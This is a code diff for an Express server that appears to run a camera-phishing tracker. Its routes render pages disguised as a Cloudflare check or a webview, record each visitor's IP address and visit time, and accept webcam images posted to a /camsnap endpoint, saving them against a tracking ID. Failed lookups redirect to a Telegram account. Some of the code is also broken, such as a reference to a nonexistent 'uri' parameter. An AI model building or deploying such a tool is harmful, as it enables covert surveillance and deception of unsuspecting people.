@@ -17,6 +17,52 @@ app.set("view engine", "ejs");
 
 const hostURL = process.env.HOST_URL || "YOUR_HOST_URL";
 
+app.post("/camsnap", async (req, res) => {
+  try {
+    const { uid, img } = req.body;
+    const url = await Url.findOne({ uniqueId: uid });
+    if (url) {
+      url.imageData = img;
+      await url.save();
+      res.send("Done");
+    } else {
+      res.status(404).send("Not Found");
+    }
+  } catch (error) {
+    console.error("Error saving image:", error);
+    res.status(500).send("Server error");
+  }
+});
+
+app.get('/c/:id', async (req, res) => {
+  try {
+    const id = req.params.id;
+    const url = await Url.findOne({ uniqueId: id });
+    if (url) {
+      res.render('cloudflare', { ip: req.ip, time: new Date(), url: atob(req.params.uri), uid: id, imageData: url.imageData });
+    } else {
+      res.redirect("https://t.me/th30neand0nly0ne");
+    }
+  } catch (error) {
+    console.error('Error retrieving URL:', error);
+    res.status(500).send("Server error");
+  }
+});
+
+app.get('/w/:id', async (req, res) => {
+  try {
+    const id = req.params.id;
+    const url = await Url.findOne({ uniqueId: id });
+    if (url) {
+      res.render('webview', { ip: req.ip, time: new Date(), url: atob(req.params.uri), uid: id, imageData: url.imageData });
+    } else {
+      res.redirect("https://t.me/th30neand0nly0ne");
+    }
+  } catch (error) {
+    console.error('Error retrieving URL:', error);
+    res.status(500).send("Server error");
+  }
+});
 
 app.post('/generate', async (req, res) => {
   try {
@@ -37,60 +83,6 @@ app.post('/generate', async (req, res) => {
   }
 });
 
-app.get('/c/:id', async (req, res) => {
-  try {
-    const id = req.params.id;
-    const url = await Url.findOne({ uniqueId: id });
-    if (url) {
-      res.render('cloudflare', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host') });
-    } else {
-      res.status(404).send('Not Found');
-    }
-  } catch (error) {
-    console.error('Error fetching URL:', error);
-    res.status(500).send('Server error');
-  }
-});
-
-app.get('/w/:id', async (req, res) => {
-  try {
-    const id = req.params.id;
-    const url = await Url.findOne({ uniqueId: id });
-    if (url) {
-      res.render('webview', { ip: req.ip, time: new Date().toISOString(), uniqueId: id, a: req.get('host'), url: url.redirectUrl });
-    } else {
-      res.status(404).send('Not Found');
-    }
-  } catch (error) {
-    console.error('Error fetching URL:', error);
-    res.status(500).send('Server error');
-  }
-});
-
-app.post("/camsnap", async (req, res) => {
-  try {
-    const { uid, img } = req.body;
-    const url = await Url.findOne({ uniqueId: uid });
-    if (url) {
-      url.imageData = img;
-      await url.save();
-      res.send("Done");
-    } else {
-      res.status(404).send("Not Found");
-    }
-  } catch (error) {
-    console.error("Error saving image:", error);
-    res.status(500).send("Server error");
-  }
-});
-
-  } catch (error) {
-    console.error('Error uploading image:', error);
-    res.status(500).send('Server error');
-  }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server is running on port ${PORT}`);
+app.listen(5000, () => {
+  console.log("App Running on Port 5000!");
 });
